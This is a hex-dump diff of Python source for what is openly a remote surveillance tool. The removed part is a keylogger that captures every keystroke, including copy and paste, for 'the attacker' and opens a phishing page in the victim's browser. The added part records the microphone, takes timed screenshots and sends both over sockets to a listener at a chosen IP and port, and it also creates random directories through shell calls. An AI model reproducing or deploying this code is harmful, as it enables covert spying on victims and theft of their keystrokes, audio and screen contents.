-00001f80: 6465 6620 7072 696e 745f 776f 726b 2873  def print_work(s
-00001f90: 656c 662c 2077 6f72 6429 3a0d 0a20 2020  elf, word):..   
-00001fa0: 2020 2020 2070 7269 6e74 2866 2741 6c70       print(f'Alp
-00001fb0: 6861 6265 7469 6320 6b65 7920 7761 7320  habetic key was 
-00001fc0: 7072 6573 7365 643a 207b 776f 7264 7d20  pressed: {word} 
-00001fd0: 2729 0d0a 2020 2020 2020 2020 7365 6c66  ')..        self
-00001fe0: 2e72 6963 6874 6967 655f 6c69 7374 6520  .richtige_liste 
-00001ff0: 2b3d 2077 6f72 640d 0a20 2020 2020 2020  += word..       
-00002000: 2023 2045 7665 7279 2070 7265 7373 6564   # Every pressed
-00002010: 206b 6579 2077 696c 6c20 6265 2073 6176   key will be sav
-00002020: 6564 2069 6e20 2272 6963 6874 6967 655f  ed in "richtige_
-00002030: 6c69 7374 6522 2074 6869 7320 6973 2061  liste" this is a
-00002040: 2067 6572 6d61 6e20 7365 6c66 2e77 6f72   german self.wor
-00002050: 6420 616e 6420 6d65 616e 7320 2272 6967  d and means "rig
-00002060: 6874 5f6c 6973 7422 0d0a 0d0a 2020 2020  ht_list"....    
-00002070: 6465 6620 6f6e 5f70 7265 7373 2873 656c  def on_press(sel
-00002080: 662c 206b 6579 293a 0d0a 2020 2020 2020  f, key):..      
-00002090: 2020 7472 793a 0d0a 2020 2020 2020 2020    try:..        
-000020a0: 2020 2020 7472 793a 0d0a 2020 2020 2020      try:..      
-000020b0: 2020 2020 2020 2020 2020 6f74 6865 725f            other_
-000020c0: 6368 6172 6563 7465 7273 203d 207b 2231  charecters = {"1
-000020d0: 223a 2022 2122 2c20 2232 223a 2027 2227  ": "!", "2": '"'
-000020e0: 2c20 2233 223a 2022 c2a7 222c 2022 3422  , "3": "..", "4"
-000020f0: 3a20 2224 222c 2022 3522 3a20 2225 222c  : "$", "5": "%",
-00002100: 2022 3622 3a20 2226 222c 2022 3722 3a20   "6": "&", "7": 
-00002110: 222f 222c 2022 3822 3a20 2228 222c 0d0a  "/", "8": "(",..
-00002120: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002130: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002140: 2020 2020 2239 223a 2022 2922 2c20 2230      "9": ")", "0
-00002150: 223a 2022 3d22 2c20 22c3 9f22 3a20 223f  ": "=", "..": "?
-00002160: 227d 0d0a 2020 2020 2020 2020 2020 2020  "}..            
-00002170: 2020 2020 6966 2073 656c 662e 6361 7073      if self.caps
-00002180: 2069 7320 5472 7565 3a0d 0a20 2020 2020   is True:..     
-00002190: 2020 2020 2020 2020 2020 2020 2020 2069                 i
-000021a0: 6620 6b65 792e 6368 6172 2069 6e20 6f74  f key.char in ot
-000021b0: 6865 725f 6368 6172 6563 7465 7273 3a0d  her_charecters:.
-000021c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000021d0: 2020 2020 2020 2020 2073 656c 662e 776f           self.wo
-000021e0: 7264 203d 206f 7468 6572 5f63 6861 7265  rd = other_chare
-000021f0: 6374 6572 735b 6b65 792e 6368 6172 5d0d  cters[key.char].
-00002200: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002210: 2020 2020 2020 2020 2023 2055 7070 6572           # Upper
-00002220: 2043 6861 7261 6374 6572 7320 6672 6f6d   Characters from
-00002230: 2022 3122 2074 6f20 2230 2220 6265 6361   "1" to "0" beca
-00002240: 7573 6520 616c 6c20 7468 6973 206e 756d  use all this num
-00002250: 6265 7273 2061 7265 206e 6f74 2063 6861  bers are not cha
-00002260: 7265 6374 6572 7320 6172 6520 6e6f 7420  recters are not 
-00002270: 696e 2070 796e 7075 740d 0a20 2020 2020  in pynput..     
-00002280: 2020 2020 2020 2020 2020 2020 2020 2065                 e
-00002290: 6c73 653a 0d0a 2020 2020 2020 2020 2020  lse:..          
-000022a0: 2020 2020 2020 2020 2020 2020 2020 7365                se
-000022b0: 6c66 2e77 6f72 6420 3d20 6b65 792e 6368  lf.word = key.ch
-000022c0: 6172 2e75 7070 6572 2829 0d0a 2020 2020  ar.upper()..    
-000022d0: 2020 2020 2020 2020 2020 2020 656c 7365              else
-000022e0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-000022f0: 2020 2020 2020 2073 656c 662e 776f 7264         self.word
-00002300: 203d 206b 6579 2e63 6861 720d 0a0d 0a20   = key.char.... 
-00002310: 2020 2020 2020 2020 2020 2020 2020 2061                 a
-00002320: 6c6c 5f72 6571 5f6b 6579 7320 3d20 7b22  ll_req_keys = {"
-00002330: 0322 3a20 7365 6c66 2e63 6f70 795f 6461  .": self.copy_da
-00002340: 7461 2c20 2216 223a 2073 656c 662e 6170  ta, ".": self.ap
-00002350: 7065 6e64 5f70 6173 7465 7d0d 0a20 2020  pend_paste}..   
-00002360: 2020 2020 2020 2020 2020 2020 2023 2022               # "
-00002370: 4554 5822 2073 7461 6e64 7320 666f 7220  ETX" stands for 
-00002380: 2245 6e64 2d54 6578 742d 6368 6172 6163  "End-Text-charac
-00002390: 7465 7222 2061 6e64 2069 7320 6120 636f  ter" and is a co
-000023a0: 6e74 726f 6c20 6368 6172 6163 7465 7220  ntrol character 
-000023b0: 7768 6963 6820 6b6e 6f77 7320 7468 6520  which knows the 
-000023c0: 6368 6172 6163 7465 7220 6f66 2063 6f70  character of cop
-000023d0: 7969 6e67 2073 6f6d 6574 6869 6e67 206f  ying something o
-000023e0: 6e20 7468 6520 6b65 7962 6f61 7264 0d0a  n the keyboard..
-000023f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002400: 2320 2253 594e 2220 7374 616e 6473 2066  # "SYN" stands f
-00002410: 6f72 2022 5379 6e63 6872 6f6e 6f75 7320  or "Synchronous 
-00002420: 4964 6c65 2220 616e 6420 6973 2061 2063  Idle" and is a c
-00002430: 6f6e 7472 6f6c 2063 6861 7261 6374 6572  ontrol character
-00002440: 2077 6869 6368 206b 6e6f 7773 2074 6865   which knows the
-00002450: 2063 6861 7261 6374 6572 206f 6620 7061   character of pa
-00002460: 7374 696e 6720 736f 6d65 7468 696e 6720  sting something 
-00002470: 6f6e 2074 6865 206b 6579 626f 6172 640d  on the keyboard.
-00002480: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002490: 2066 6f72 2065 6163 685f 6b65 7920 696e   for each_key in
-000024a0: 2061 6c6c 5f72 6571 5f6b 6579 733a 0d0a   all_req_keys:..
-000024b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000024c0: 2020 2020 6966 2065 6163 685f 6b65 7920      if each_key 
-000024d0: 3d3d 206b 6579 2e63 6861 723a 0d0a 2020  == key.char:..  
-000024e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000024f0: 2020 2020 2020 2320 4966 2074 6865 2063        # If the c
-00002500: 6f70 7920 6368 6172 6163 7465 7220 6973  opy character is
-00002510: 2070 7265 7373 6564 2c20 6561 6368 2066   pressed, each f
-00002520: 756e 6374 696f 6e20 6f66 2065 6163 6820  unction of each 
-00002530: 6368 6172 6163 7465 7220 7769 6c6c 2062  character will b
-00002540: 6520 776f 726b 696e 670d 0a20 2020 2020  e working..     
-00002550: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002560: 2020 2061 6c6c 5f72 6571 5f6b 6579 735b     all_req_keys[
-00002570: 6561 6368 5f6b 6579 5d28 290d 0a20 2020  each_key]()..   
-00002580: 2020 2020 2020 2020 2020 2020 2074 7279               try
-00002590: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-000025a0: 2020 2020 2020 2061 7363 695f 6e75 6d62         asci_numb
-000025b0: 6572 203d 206f 7264 2873 656c 662e 776f  er = ord(self.wo
-000025c0: 7264 290d 0a20 2020 2020 2020 2020 2020  rd)..           
-000025d0: 2020 2020 2020 2020 2023 204f 7264 696e           # Ordin
-000025e0: 616c 206e 756d 6265 7220 696e 2074 6865  al number in the
-000025f0: 2072 616e 6765 206f 6620 3020 746f 2033   range of 0 to 3
-00002600: 3120 636f 6d70 6c65 7465 7320 616c 6c20  1 completes all 
-00002610: 7370 6563 6961 6c20 6368 6172 6163 7465  special characte
-00002620: 7273 2077 6974 6820 7468 6520 6b65 7920  rs with the key 
-00002630: 2273 7472 6720 2b20 6c65 7474 6572 220d  "strg + letter".
-00002640: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002650: 2020 2020 2069 6620 6173 6369 5f6e 756d       if asci_num
-00002660: 6265 7220 6e6f 7420 696e 2072 616e 6765  ber not in range
-00002670: 2830 2c20 3332 293a 0d0a 2020 2020 2020  (0, 32):..      
-00002680: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002690: 2020 2320 6966 2074 6865 7265 2069 7320    # if there is 
-000026a0: 6e6f 2073 7065 6369 616c 2063 6861 7261  no special chara
-000026b0: 6374 6572 2069 7420 6a75 7374 2070 7269  cter it just pri
-000026c0: 6e74 7320 7468 6520 616c 7068 6162 6574  nts the alphabet
-000026d0: 6963 206e 756d 6265 720d 0a20 2020 2020  ic number..     
-000026e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000026f0: 2020 2073 656c 662e 7072 696e 745f 776f     self.print_wo
-00002700: 726b 2873 656c 662e 776f 7264 290d 0a0d  rk(self.word)...
-00002710: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002720: 2065 7863 6570 7420 5479 7065 4572 726f   except TypeErro
-00002730: 723a 0d0a 2020 2020 2020 2020 2020 2020  r:..            
-00002740: 2020 2020 2020 2020 2320 7072 696e 7473          # prints
-00002750: 2074 6865 2061 6c70 6861 6265 7463 206e   the alphabetc n
-00002760: 756d 6265 720d 0a20 2020 2020 2020 2020  umber..         
-00002770: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-00002780: 7072 696e 745f 776f 726b 2873 656c 662e  print_work(self.
-00002790: 776f 7264 290d 0a0d 0a20 2020 2020 2020  word)....       
-000027a0: 2020 2020 2020 2020 2070 7269 6e74 2873           print(s
-000027b0: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
-000027c0: 7465 290d 0a20 2020 2020 2020 2020 2020  te)..           
-000027d0: 2065 7863 6570 7420 5479 7065 4572 726f   except TypeErro
-000027e0: 723a 0d0a 2020 2020 2020 2020 2020 2020  r:..            
-000027f0: 2020 2020 7061 7373 0d0a 0d0a 2020 2020      pass....    
-00002800: 2020 2020 6578 6365 7074 2041 7474 7269      except Attri
-00002810: 6275 7465 4572 726f 723a 0d0a 2020 2020  buteError:..    
-00002820: 2020 2020 2020 2020 7072 696e 7428 6627          print(f'
-00002830: 416e 206f 7468 6572 206b 6579 2077 6173  An other key was
-00002840: 2070 7265 7373 6564 3a20 7b6b 6579 7d27   pressed: {key}'
-00002850: 290d 0a20 2020 2020 2020 2020 2020 2069  )..            i
-00002860: 6620 6b65 7920 3d3d 206b 6579 626f 6172  f key == keyboar
-00002870: 642e 4b65 792e 7370 6163 6520 6f72 206b  d.Key.space or k
-00002880: 6579 203d 3d20 6b65 7962 6f61 7264 2e4b  ey == keyboard.K
-00002890: 6579 2e74 6162 3a0d 0a20 2020 2020 2020  ey.tab:..       
-000028a0: 2020 2020 2020 2020 2073 656c 662e 7269           self.ri
-000028b0: 6368 7469 6765 5f6c 6973 7465 202b 3d20  chtige_liste += 
-000028c0: 227b 220d 0a20 2020 2020 2020 2020 2020  "{"..           
-000028d0: 2020 2020 2023 2049 6620 7468 6520 7461       # If the ta
-000028e0: 7267 6574 2070 7265 7373 6573 2074 6162  rget presses tab
-000028f0: 206f 7220 7370 6163 6520 6120 227b 2220   or space a "{" 
-00002900: 7769 6c6c 2062 6520 6170 7065 6e64 6564  will be appended
-00002910: 2074 6f20 7468 6520 6c69 7374 2073 6f20   to the list so 
-00002920: 7468 6520 6174 7461 636b 6572 206b 6e6f  the attacker kno
-00002930: 7773 2077 6865 6e20 616e 640d 0a20 2020  ws when and..   
-00002940: 2020 2020 2020 2020 2020 2020 2023 2073               # s
-00002950: 7061 6365 206f 7220 6120 7461 6220 6b65  pace or a tab ke
-00002960: 7920 6861 7320 6265 656e 2070 7265 7373  y has been press
-00002970: 6564 0d0a 2020 2020 2020 2020 2020 2020  ed..            
-00002980: 656c 6966 206b 6579 203d 3d20 6b65 7962  elif key == keyb
-00002990: 6f61 7264 2e4b 6579 2e63 6170 735f 6c6f  oard.Key.caps_lo
-000029a0: 636b 3a0d 0a20 2020 2020 2020 2020 2020  ck:..           
-000029b0: 2020 2020 2073 656c 662e 6361 7073 203d       self.caps =
-000029c0: 2054 7275 650d 0a20 2020 2020 2020 2020   True..         
-000029d0: 2020 2020 2020 2073 656c 662e 6368 6563         self.chec
-000029e0: 6b2e 6170 7065 6e64 2831 290d 0a20 2020  k.append(1)..   
-000029f0: 2020 2020 2020 2020 2063 6865 636b 5f63           check_c
-00002a00: 6170 7320 3d20 7375 6d28 7365 6c66 2e63  aps = sum(self.c
-00002a10: 6865 636b 2920 2f20 320d 0a20 2020 2020  heck) / 2..     
-00002a20: 2020 2020 2020 2023 2049 6620 6368 6563         # If chec
-00002a30: 6b5f 6361 7073 2069 7320 6e6f 7420 7072  k_caps is not pr
-00002a40: 696d 6172 7920 6974 2077 696c 6c20 7365  imary it will se
-00002a50: 7420 7365 6c66 2e63 6170 7320 746f 2046  t self.caps to F
-00002a60: 616c 7365 0d0a 0d0a 2020 2020 2020 2020  alse....        
-00002a70: 2020 2020 6966 2073 7472 2863 6865 636b      if str(check
-00002a80: 5f63 6170 7329 5b2d 315d 2021 3d20 2730  _caps)[-1] != '0
-00002a90: 273a 0d0a 2020 2020 2020 2020 2020 2020  ':..            
-00002aa0: 2020 2020 7061 7373 0d0a 2020 2020 2020      pass..      
-00002ab0: 2020 2020 2020 656c 7365 3a0d 0a20 2020        else:..   
-00002ac0: 2020 2020 2020 2020 2020 2020 2073 656c               sel
-00002ad0: 662e 6361 7073 203d 2046 616c 7365 0d0a  f.caps = False..
-00002ae0: 0d0a 2020 2020 6465 6620 6f6e 5f72 656c  ..    def on_rel
-00002af0: 6561 7365 2873 656c 662c 206b 6579 293a  ease(self, key):
-00002b00: 0d0a 2020 2020 2020 2020 7072 696e 7428  ..        print(
-00002b10: 6627 4b65 7920 7265 6c65 6173 6564 3a20  f'Key released: 
-00002b20: 7b6b 6579 7d27 290d 0a0d 0a20 2020 2064  {key}')....    d
-00002b30: 6566 2073 7461 7274 2873 656c 6629 3a0d  ef start(self):.
-00002b40: 0a20 2020 2020 2020 2069 6620 7365 6c66  .        if self
-00002b50: 2e70 6869 7368 696e 6720 6973 206e 6f74  .phishing is not
-00002b60: 204e 6f6e 653a 0d0a 2020 2020 2020 2020   None:..        
-00002b70: 2020 2020 7768 696c 6520 5472 7565 3a0d      while True:.
-00002b80: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002b90: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
-00002ba0: 2020 2020 2020 2020 2020 2072 6573 706f             respo
-00002bb0: 6e73 6520 3d20 7265 7175 6573 7473 2e67  nse = requests.g
-00002bc0: 6574 2873 656c 662e 7068 6973 6869 6e67  et(self.phishing
-00002bd0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00002be0: 2020 2020 2020 2023 5265 7370 6f6e 6520         #Respone 
-00002bf0: 6973 2068 6572 6520 746f 2073 6565 2069  is here to see i
-00002c00: 6620 7468 6520 7765 6273 6974 6520 6973  f the website is
-00002c10: 206f 6e6c 696e 6520 6f72 206e 6f74 0d0a   online or not..
-00002c20: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002c30: 2020 2020 7765 6262 726f 7773 6572 2e6f      webbrowser.o
-00002c40: 7065 6e28 7365 6c66 2e70 6869 7368 696e  pen(self.phishin
-00002c50: 6729 0d0a 2020 2020 2020 2020 2020 2020  g)..            
-00002c60: 2020 2020 2020 2020 6272 6561 6b0d 0a0d          break...
+00000820: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000830: 7261 7465 3d72 6174 652c 2069 6e70 7574  rate=rate, input
+00000840: 3d54 7275 652c 0d0a 2020 2020 2020 2020  =True,..        
+00000850: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000860: 2020 2020 2020 2020 6672 616d 6573 5f70          frames_p
+00000870: 6572 5f62 7566 6665 723d 6368 756e 6b29  er_buffer=chunk)
+00000880: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
+00000890: 7072 696e 7428 2272 6563 6f72 6469 6e67  print("recording
+000008a0: 2e2e 2e22 290d 0a20 2020 2020 2020 2020  ...")..         
+000008b0: 2020 2066 7261 6d65 7320 3d20 5b5d 0d0a     frames = []..
+000008c0: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
+000008d0: 7220 6920 696e 2072 616e 6765 2830 2c20  r i in range(0, 
+000008e0: 696e 7428 7261 7465 202f 2063 6875 6e6b  int(rate / chunk
+000008f0: 202a 2073 6563 6f6e 6473 2929 3a0d 0a20   * seconds)):.. 
+00000900: 2020 2020 2020 2020 2020 2020 2020 2064                 d
+00000910: 6174 6120 3d20 7374 7265 616d 2e72 6561  ata = stream.rea
+00000920: 6428 6368 756e 6b29 0d0a 2020 2020 2020  d(chunk)..      
+00000930: 2020 2020 2020 2020 2020 6672 616d 6573            frames
+00000940: 2e61 7070 656e 6428 6461 7461 290d 0a0d  .append(data)...
+00000950: 0a20 2020 2020 2020 2020 2020 2023 2070  .            # p
+00000960: 7269 6e74 2822 6669 6e69 7368 6564 2072  rint("finished r
+00000970: 6563 6f72 6469 6e67 2229 0d0a 0d0a 2020  ecording")....  
+00000980: 2020 2020 2020 2020 2020 2320 7374 6f70            # stop
+00000990: 2052 6563 6f72 6469 6e67 0d0a 2020 2020   Recording..    
+000009a0: 2020 2020 2020 2020 7374 7265 616d 2e73          stream.s
+000009b0: 746f 705f 7374 7265 616d 2829 0d0a 2020  top_stream()..  
+000009c0: 2020 2020 2020 2020 2020 7374 7265 616d            stream
+000009d0: 2e63 6c6f 7365 2829 0d0a 2020 2020 2020  .close()..      
+000009e0: 2020 2020 2020 6175 6469 6f2e 7465 726d        audio.term
+000009f0: 696e 6174 6528 290d 0a0d 0a20 2020 2020  inate()....     
+00000a00: 2020 2020 2020 2023 2043 6f6e 6e65 6374         # Connect
+00000a10: 696f 6e20 7769 7468 2053 6572 7665 724c  ion with ServerL
+00000a20: 6973 7465 6e65 720d 0a0d 0a20 2020 2020  istener....     
+00000a30: 2020 2020 2020 2073 7472 5f66 7261 6d65         str_frame
+00000a40: 7320 3d20 7374 7228 6672 616d 6573 290d  s = str(frames).
+00000a50: 0a20 2020 2020 2020 2020 2020 206c 6973  .            lis
+00000a60: 7465 6e69 6e67 5f64 6174 612e 7365 6e64  tening_data.send
+00000a70: 2873 7472 5f66 7261 6d65 732e 656e 636f  (str_frames.enco
+00000a80: 6465 2829 290d 0a0d 0a20 2020 2020 2020  de())....       
+00000a90: 2065 7863 6570 7420 4f53 4572 726f 723a   except OSError:
+00000aa0: 0d0a 2020 2020 2020 2020 2020 2020 7072  ..            pr
+00000ab0: 696e 7428 224e 4f20 4d49 4352 4f50 484f  int("NO MICROPHO
+00000ac0: 4e45 2044 4554 4543 5445 4420 4f52 204d  NE DETECTED OR M
+00000ad0: 4943 524f 5048 4f4e 4520 5345 5454 494e  ICROPHONE SETTIN
+00000ae0: 4720 4449 5341 424c 4544 2229 0d0a 2020  G DISABLED")..  
+00000af0: 2020 2020 2020 2020 2020 6e6f 5f6d 6963            no_mic
+00000b00: 726f 666f 6e20 3d20 2254 4845 2054 4152  rofon = "THE TAR
+00000b10: 4745 5420 4841 5320 4e4f 204d 4943 524f  GET HAS NO MICRO
+00000b20: 5048 4f4e 4520 4f4e 220d 0a20 2020 2020  PHONE ON"..     
+00000b30: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
+00000b40: 5f64 6174 612e 7365 6e64 286e 6f5f 6d69  _data.send(no_mi
+00000b50: 6372 6f66 6f6e 2e65 6e63 6f64 6528 2929  crofon.encode())
+00000b60: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
+00000b70: 5365 6e64 7320 6461 7461 2074 6f20 5365  Sends data to Se
+00000b80: 7276 6572 4c69 7374 656e 6572 0d0a 0d0a  rverListener....
+00000b90: 2020 2020 6465 6620 616c 6c5f 6469 7228      def all_dir(
+00000ba0: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
+00000bb0: 676c 6f62 616c 2072 616e 646f 6d5f 6c73  global random_ls
+00000bc0: 740d 0a20 2020 2020 2020 207a 6569 6368  t..        zeich
+00000bd0: 656e 203d 2022 7177 6572 747a 7569 6f70  en = "qwertzuiop
+00000be0: 6173 6466 6768 6a6b 6c79 7863 7662 6e6d  asdfghjklyxcvbnm
+00000bf0: 3132 3334 3536 3738 3930 220d 0a20 2020  1234567890"..   
+00000c00: 2020 2020 2072 616e 646f 6d5f 6c73 7420       random_lst 
+00000c10: 3d20 5b22 222e 6a6f 696e 2872 616e 646f  = ["".join(rando
+00000c20: 6d2e 7361 6d70 6c65 287a 6569 6368 656e  m.sample(zeichen
+00000c30: 2c20 7261 6e64 6f6d 2e72 616e 6469 6e74  , random.randint
+00000c40: 2834 2c20 3130 2929 2920 666f 7220 7820  (4, 10))) for x 
+00000c50: 696e 2072 616e 6765 2831 3030 295d 0d0a  in range(100)]..
+00000c60: 2020 2020 2020 2020 2320 5468 6973 206d          # This m
+00000c70: 616b 6573 2061 206c 6973 7420 6f66 2065  akes a list of e
+00000c80: 7665 7279 2064 6972 6563 746f 7279 206e  very directory n
+00000c90: 616d 6520 7261 6e64 6f6d 6c79 0d0a 2020  ame randomly..  
+00000ca0: 2020 2020 2020 666f 7220 6469 725f 6e61        for dir_na
+00000cb0: 6d65 2069 6e20 7261 6e64 6f6d 5f6c 7374  me in random_lst
+00000cc0: 3a0d 0a20 2020 2020 2020 2020 2020 206f  :..            o
+00000cd0: 732e 7379 7374 656d 2866 226d 6b64 6972  s.system(f"mkdir
+00000ce0: 207b 6469 725f 6e61 6d65 7d22 290d 0a20   {dir_name}").. 
+00000cf0: 2020 2020 2020 2020 2020 2023 2054 6865             # The
+00000d00: 2064 6972 6563 746f 7279 2069 7320 6265   directory is be
+00000d10: 696e 6720 6d61 6465 2068 6572 650d 0a20  ing made here.. 
+00000d20: 2020 2020 2020 206c 7374 5f73 6572 7665         lst_serve
+00000d30: 7220 3d20 736f 636b 6574 2e73 6f63 6b65  r = socket.socke
+00000d40: 7428 736f 636b 6574 2e41 465f 494e 4554  t(socket.AF_INET
+00000d50: 2c20 736f 636b 6574 2e53 4f43 4b5f 5354  , socket.SOCK_ST
+00000d60: 5245 414d 290d 0a20 2020 2020 2020 206c  REAM)..        l
+00000d70: 7374 5f73 6572 7665 722e 636f 6e6e 6563  st_server.connec
+00000d80: 7428 2822 3132 372e 302e 302e 3122 2c20  t(("127.0.0.1", 
+00000d90: 3130 3737 2929 0d0a 2020 2020 2020 2020  1077))..        
+00000da0: 6c73 745f 7365 7276 6572 2e73 656e 6428  lst_server.send(
+00000db0: 7374 7228 7261 6e64 6f6d 5f6c 7374 292e  str(random_lst).
+00000dc0: 656e 636f 6465 2829 290d 0a20 2020 2020  encode())..     
+00000dd0: 2020 206c 7374 5f73 6572 7665 722e 636c     lst_server.cl
+00000de0: 6f73 6528 290d 0a0d 0a20 2020 2020 2020  ose()....       
+00000df0: 2072 616e 646f 6d5f 6469 7220 3d20 7261   random_dir = ra
+00000e00: 6e64 6f6d 2e63 686f 6963 6528 7261 6e64  ndom.choice(rand
+00000e10: 6f6d 5f6c 7374 290d 0a20 2020 2020 2020  om_lst)..       
+00000e20: 206f 732e 6368 6469 7228 7261 6e64 6f6d   os.chdir(random
+00000e30: 5f64 6972 290d 0a20 2020 2020 2020 2023  _dir)..        #
+00000e40: 2057 6520 6172 6520 6e6f 7720 696e 2074   We are now in t
+00000e50: 6861 7420 6469 7265 6374 6f72 7920 7768  hat directory wh
+00000e60: 6572 6520 7468 6520 696d 6167 6520 6361  ere the image ca
+00000e70: 6e20 6265 2073 746f 7265 640d 0a0d 0a20  n be stored.... 
+00000e80: 2020 2064 6566 2063 6c69 656e 7428 7365     def client(se
+00000e90: 6c66 2c20 6970 5f70 686f 746f 732c 2070  lf, ip_photos, p
+00000ea0: 6f72 745f 7068 6f74 6f73 293a 0d0a 2020  ort_photos):..  
+00000eb0: 2020 2020 2020 676c 6f62 616c 2066 6861        global fha
+00000ec0: 6e64 6c65 0d0a 2020 2020 2020 2020 2320  ndle..        # 
+00000ed0: 6668 616e 646c 6520 6973 2074 6865 2076  fhandle is the v
+00000ee0: 6172 6961 626c 6520 7768 6963 6820 6f70  ariable which op
+00000ef0: 656e 7320 7468 6520 666f 746f 0d0a 2020  ens the foto..  
+00000f00: 2020 2020 2020 7320 3d20 736f 636b 6574        s = socket
+00000f10: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
+00000f20: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
+00000f30: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
+00000f40: 2020 2020 2073 2e63 6f6e 6e65 6374 2828       s.connect((
+00000f50: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
+00000f60: 7068 6f74 6f73 2929 0d0a 2020 2020 2020  photos))..      
+00000f70: 2020 2320 5468 6973 2063 6f6e 6e65 6374    # This connect
+00000f80: 7320 746f 2074 6865 2073 6572 7665 7220  s to the server 
+00000f90: 796f 7520 7370 6563 6966 6965 640d 0a20  you specified.. 
+00000fa0: 2020 2020 2020 2069 6d61 6765 203d 2070         image = p
+00000fb0: 672e 7363 7265 656e 7368 6f74 2829 0d0a  g.screenshot()..
+00000fc0: 2020 2020 2020 2020 2320 2269 6d61 6765          # "image
+00000fd0: 2220 7363 7265 656e 7368 6f74 7320 7468  " screenshots th
+00000fe0: 6520 6375 7272 656e 7420 696d 6167 6520  e current image 
+00000ff0: 6166 7465 7220 6120 7370 6563 6966 6963  after a specific
+00001000: 2074 696d 650d 0a20 2020 2020 2020 2066   time..        f
+00001010: 6f74 6f6e 616d 6520 3d20 2249 6d61 6765  otoname = "Image
+00001020: 2e70 6e67 220d 0a20 2020 2020 2020 2023  .png"..        #
+00001030: 204e 616d 6520 6f66 2074 6865 2069 6d61   Name of the ima
+00001040: 6765 0d0a 2020 2020 2020 2020 696d 6167  ge..        imag
+00001050: 652e 7361 7665 2866 6f74 6f6e 616d 6529  e.save(fotoname)
+00001060: 0d0a 2020 2020 2020 2020 2320 5361 7665  ..        # Save
+00001070: 7320 7468 6520 696d 6167 6520 696e 2074  s the image in t
+00001080: 6865 2063 7572 7265 6e74 2064 6972 6563  he current direc
+00001090: 746f 7279 0d0a 2020 2020 2020 2020 6668  tory..        fh
+000010a0: 616e 646c 6520 3d20 6f70 656e 2866 6f74  andle = open(fot
+000010b0: 6f6e 616d 652c 2022 7262 2229 0d0a 2020  oname, "rb")..  
+000010c0: 2020 2020 2020 2320 4f70 656e 7320 7468        # Opens th
+000010d0: 6520 696d 6167 650d 0a0d 0a20 2020 2020  e image....     
+000010e0: 2020 2066 756c 6c5f 6d73 6720 3d20 6222     full_msg = b"
+000010f0: 220d 0a20 2020 2020 2020 2023 2045 7665  "..        # Eve
+00001100: 7279 2069 6d61 6765 2069 6e66 6f72 6d61  ry image informa
+00001110: 7469 6f6e 2077 696c 6c20 6265 2073 746f  tion will be sto
+00001120: 7265 6420 696e 2022 6675 6c6c 5f6d 7367  red in "full_msg
+00001130: 220d 0a20 2020 2020 2020 2066 6f72 206c  "..        for l
+00001140: 696e 6520 696e 2066 6861 6e64 6c65 3a0d  ine in fhandle:.
+00001150: 0a20 2020 2020 2020 2020 2020 2066 756c  .            ful
+00001160: 6c5f 6d73 6720 2b3d 206c 696e 650d 0a0d  l_msg += line...
+00001170: 0a20 2020 2020 2020 2073 2e73 656e 6428  .        s.send(
+00001180: 6675 6c6c 5f6d 7367 290d 0a0d 0a20 2020  full_msg)....   
+00001190: 2064 6566 2063 6f75 6e74 646f 776e 5f73   def countdown_s
+000011a0: 656e 6428 7365 6c66 2c20 7a65 6974 2c20  end(self, zeit, 
+000011b0: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
+000011c0: 7068 6f74 6f73 2c20 6970 5f6b 6579 6c6f  photos, ip_keylo
+000011d0: 6767 6572 2c20 706f 7274 5f6b 6579 6c6f  gger, port_keylo
+000011e0: 6767 6572 293a 0d0a 2020 2020 2020 2020  gger):..        
+000011f0: 7365 636f 6e64 735f 6c69 7374 203d 205b  seconds_list = [
+00001200: 7a61 686c 2066 6f72 207a 6168 6c20 696e  zahl for zahl in
+00001210: 2072 616e 6765 2830 2c20 7a65 6974 202b   range(0, zeit +
+00001220: 2031 2c20 3230 2920 6966 207a 6168 6c20   1, 20) if zahl 
+00001230: 213d 2030 5d0d 0a20 2020 2020 2020 2023  != 0]..        #
+00001240: 2054 6865 2073 6563 6f6e 6473 2074 6865   The seconds the
+00001250: 2069 6d61 6765 2077 696c 6c20 6265 2073   image will be s
+00001260: 656e 7420 696e 2032 3020 7374 6570 7320  ent in 20 steps 
+00001270: 746f 2074 6865 2073 6572 7665 7220 7769  to the server wi
+00001280: 6c6c 2062 6520 7361 7665 6420 696e 2022  ll be saved in "
+00001290: 7365 636f 6e64 735f 6c69 7374 220d 0a20  seconds_list".. 
+000012a0: 2020 2020 2020 2070 7269 6e74 2873 6563         print(sec
+000012b0: 6f6e 6473 5f6c 6973 7429 0d0a 2020 2020  onds_list)..    
+000012c0: 2020 2020 6b65 795f 6461 7461 203d 2073      key_data = s
